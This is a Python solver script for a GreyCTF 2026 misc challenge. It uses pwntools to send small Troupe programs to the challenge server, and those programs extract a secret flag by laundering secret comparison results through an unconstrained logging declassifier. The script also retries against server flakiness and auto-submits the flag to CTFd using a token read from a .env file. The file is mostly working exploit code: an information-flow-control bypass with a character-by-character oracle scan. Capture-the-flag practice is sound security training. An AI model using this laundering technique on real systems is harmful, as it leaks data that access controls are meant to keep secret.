#!/usr/bin/env python3
r"""
Solver for "An old soviet terminal" (GreyCTF 2026, misc, challenge_id=8).

SOLUTION ATTACK (IFC laundering)
    receiver.trp exposes, to retriever():
      compare(i,ch)  -> SECRET bool  (charAt transmission i == ch), never declassified
      log(x)         -> UNCONSTRAINED declassify(x) -> PUBLIC
      analyze()      -> PUBLIC length L
    retriever() runs ON the receiver node (reader: send(tid, f())), so compare/log are
    LOCAL actor messages. Trick: receive the secret compare-bool, send it to log WITHOUT
    branching (pc stays LOW), receive the PUBLIC laundered bool, THEN branch on it. Linear
    scan a frequency-ordered charset per index, early-exit -> the flag char.

WARNING: there is 600bytes limit on the code can send

WHY IT KEPT FAILING
    terminal.trp self-kills 2000ms after spawn. Whole scan must finish in <~2s. The
    whole-flag scan is too many round-trips -> node dies before printing -> no "Message:".
    Fix = small windows that always finish + ordered charset (known grey{...} chars first
    -> matched in 1-6 compares -> cheap). Server is flaky (fork BlockingIOError / refused /
    early close under load) -> just retry, paced ~1s.

USAGE
    uv run python fast.py            # auto: length -> try full -> window sweep -> submit
    uv run python fast.py full       # one-shot whole-flag attempt only
    uv run python fast.py len        # just print discovered length
    uv run python fast.py win LO HI  # extract one window [LO,HI)
"""
import sys, time, fcntl, os, re
from pwn import *

context.log_level = 'error'
HOST, PORT = 'challs.nusgreyhats.org', 36167
LOGFILE = 'nc.log'                       # every byte the server returns is appended here
FOUNDLOG = 'found.log'                   # one line per FOUND char / window success

# charset ORDERED: flag structure first, then lowercase by English freq, digits, symbols,
# uppercase last. Real flag chars (grey{...}) match within a few compares -> few round-trips.
CS = "grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ"

# shared Troupe helpers: a=charAt(cs), p=launder one compare to PUBLIC bool, sc=scan+early-exit
HELP = (
 'fun a j=substring(cs,j,j+1)\n'
 'fun p i d=(send(analysisService,("compare",self(),i,d));receive[hn("comparison",s)=>'
 '(send(logService,("log",self(),s));receive[hn("logged",b)=>b])])\n'
 'fun sc i j=if a j="" then "?" else if p i(a j)then a j else sc i(j+1)\n')

def code_window(lo, hi, cs=CS):
    return ('let val cs="%s"\n%s'
            'fun bd i h=if i>=h then "" else (sc i 0)^bd(i+1)h\n'
            'in bd %d %d end\n') % (cs, HELP, lo, hi)

def code_length():
    return ('let val _=send(analysisService,("analyze",self()))\n'
            'val n=receive[hn("analysis",L)=>L]\n'
            'fun s i=if i>=n then "" else "#"^s(i+1)\n'
            'in s 0 end\n')

# ── rate gate: fire ~1/s, shared with soviet.py so concurrent procs never burst ──
LOCKFILE = '/tmp/soviet_nc.gate'
MIN_GAP = 1.0

def _stamp(lf):
    lf.seek(0); lf.truncate(); lf.write(str(time.time())); lf.flush()

def _pace():
    """Block until MIN_GAP since the last try, then reserve the slot (stamp now)."""
    lf = open(LOCKFILE, 'a+'); fcntl.flock(lf, fcntl.LOCK_EX)
    try:
        lf.seek(0); data = lf.read().strip()
        last = float(data) if data else 0.0
        wait = MIN_GAP - (time.time() - last)
        if wait > 0:
            time.sleep(wait)
    finally:
        _stamp(lf); fcntl.flock(lf, fcntl.LOCK_UN); lf.close()

def _mark():
    """Re-stamp lockfile with the true try-END time, so next gap counts from here."""
    lf = open(LOCKFILE, 'a+'); fcntl.flock(lf, fcntl.LOCK_EX)
    try: _stamp(lf)
    finally: fcntl.flock(lf, fcntl.LOCK_UN); lf.close()

def logblk(label, dt, out):
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(LOGFILE, 'a') as f:
        f.write(f"\n===== {ts}  {label}  lifetime={dt}s =====\n")
        f.write((out or '(no output)') + "\n")

def logfound(idx, ch, partial):
    """Append one line per FOUND char to found.log (the success log)."""
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(FOUNDLOG, 'a') as f:
        f.write(f"{ts} idx={idx} char={ch!r} partial={partial}\n")

def fire(code, settle=3):
    """Connect -> wait menu '>>' -> 4 -> wait Transmission '>>' -> code+EOF -> dump bytes."""
    nb = len(code.encode())
    if nb > 600:
        return None, f'[ABORT: program {nb} bytes > 600 limit]'
    _pace()
    try:
        io = remote(HOST, PORT, timeout=5)
    except Exception as e:
        _mark(); return None, f'CONNECT FAIL: {e}'
    t0 = time.time(); out = b''
    try:
        out += io.recvuntil(b'>>', timeout=4)        # main menu
        io.sendline(b'4')                            # Transmission
        out += io.recvuntil(b'>>', timeout=4)        # transmission prompt
        io.send(code.encode() + b'\nEOF\n')          # submit program
        io.settimeout(1)
        deadline = time.time() + settle
        while time.time() < deadline:
            try:
                c = io.recv(4096)
                if not c: break
                out += c
            except EOFError: break
            except Exception: pass
    except EOFError:
        out += b'\n[server closed early]'
    except Exception as e:
        out += f'\n[error: {e}]'.encode()
    finally:
        try: io.close()
        except Exception: pass
        _mark()
    return round(time.time() - t0, 2), out.decode(errors='replace')

def parse(out):
    if out is None:
        return ('connfail', '')
    if 'BlockingIOError' in out or 'Traceback (most recent' in out or 'Resource temporarily' in out:
        return ('srvbusy', '')                       # server fork-fail under load -> transient
    if 'exceeds maximum allocation' in out:
        return ('toobig', '')
    if 'terminated abnormally' in out:
        return ('error', '')
    msgs = [l.split('Message:', 1)[1].rstrip('║').strip()
            for l in out.splitlines() if 'Message:' in l]
    return ('msg', ' '.join(m for m in msgs if m)) if any(msgs) else ('none', '')

def run_until(code, label, tries):
    """Fire (paced) until a real result ('msg'/'error'/'toobig'); retry transient flakiness."""
    for k in range(1, tries + 1):
        dt, out = fire(code)
        kind, text = parse(out)
        logblk(f"{label} try{k}/{tries} -> {kind}", dt, out)
        print(f"  [{label}] try {k}/{tries}: {kind}{' = '+repr(text) if text else ''}  ({dt}s)", flush=True)
        if kind == 'msg':
            return text
        if kind == 'toobig':
            return None                              # deterministic: >600B, retry won't help
        # 'error' = "terminated abnormally" = mostly the 2000ms node-kill (TIMEOUT),
        # not an IFC fault for legal probes -> transient, keep retrying. 'srvbusy'/'none'
        # /'connfail' also transient (server fork-starvation) -> retry.
    return None

# ── orchestration ────────────────────────────────────────────────────────────────────────
def get_length(tries=12):
    txt = run_until(code_length(), 'length', tries)
    if txt is None:
        return None
    n = txt.count('#')
    print(f">>> length L = {n}", flush=True)
    return n or None

def sweep(L, tries_per=10):
    """Extract [0,L) in adaptive windows; shrink on timeout; concat."""
    flag = ['?'] * L
    lo, W = 0, 8
    while lo < L:
        hi = min(lo + W, L)
        txt = run_until(code_window(lo, hi), f"win[{lo}:{hi}]", tries_per)
        if txt and '?' not in txt and len(txt) == hi - lo:
            for j, ch in enumerate(txt):
                flag[lo + j] = ch
                logfound(lo + j, ch, ''.join(flag))      # success log: every found char
            print(f">>> got [{lo}:{hi}] = {txt!r}   partial: {''.join(flag)}", flush=True)
            lo = hi
        else:
            if W > 1:                                # too slow / dirty -> shrink window, retry
                W = max(1, W // 2)
                print(f"!!! window [{lo}:{hi}] failed (got {txt!r}); shrink W -> {W}", flush=True)
            else:
                print(f"!!! single-char [{lo}] failed; giving up that index", flush=True)
                lo += 1
    return ''.join(flag)

def submit(flag):
    env = {}
    for p in ('.env', '../../../../.env', os.path.join(os.path.dirname(__file__), '../../../../.env')):
        if os.path.exists(p):
            for line in open(p):
                if '=' in line and not line.strip().startswith('#'):
                    k, v = line.strip().split('=', 1); env[k] = v.strip().strip('"').strip("'")
            break
    url, tok = env.get('CTFD_URL'), env.get('CTFD_API_TOKEN')
    if not url or not tok:
        print(f"\n>>> FLAG: {flag}\n(no CTFD_URL/CTFD_API_TOKEN in .env -> submit manually)"); return
    import requests
    r = requests.post(url.rstrip('/') + '/api/v1/challenges/attempt',
                      headers={'Authorization': f'Token {tok}', 'Content-Type': 'application/json'},
                      json={'challenge_id': 8, 'submission': flag}, timeout=15)
    print(f"\n>>> SUBMIT {flag} -> {r.status_code} {r.text}")

def main():
    a = sys.argv[1:]
    if a and a[0] == 'len':
        get_length(); return
    if a and a[0] == 'win':
        lo, hi = int(a[1]), int(a[2])
        print(run_until(code_window(lo, hi), f"win[{lo}:{hi}]", 12)); return
    if a and a[0] == 'full':
        L = get_length() or 60
        txt = run_until(code_window(0, L), 'full', 8)
        if txt and 'grey{' in txt:
            print(f">>> FULL flag: {txt}"); submit(re.search(r'grey\{[^}]*\}', txt).group(0))
        return
    # auto
    L = get_length()
    if not L:
        print("could not get length; aborting"); return
    txt = run_until(code_window(0, L), 'full', 4)          # fast path: whole flag one shot
    if txt and 'grey{' in txt and '?' not in txt:
        flag = re.search(r'grey\{[^}]*\}', txt)
        if flag:
            submit(flag.group(0)); return
    print(">>> full one-shot incomplete; falling back to window sweep", flush=True)
    flag = sweep(L)
    m = re.search(r'grey\{[^}]*\}', flag)
    submit(m.group(0) if m else flag)

if __name__ == '__main__':
    main()
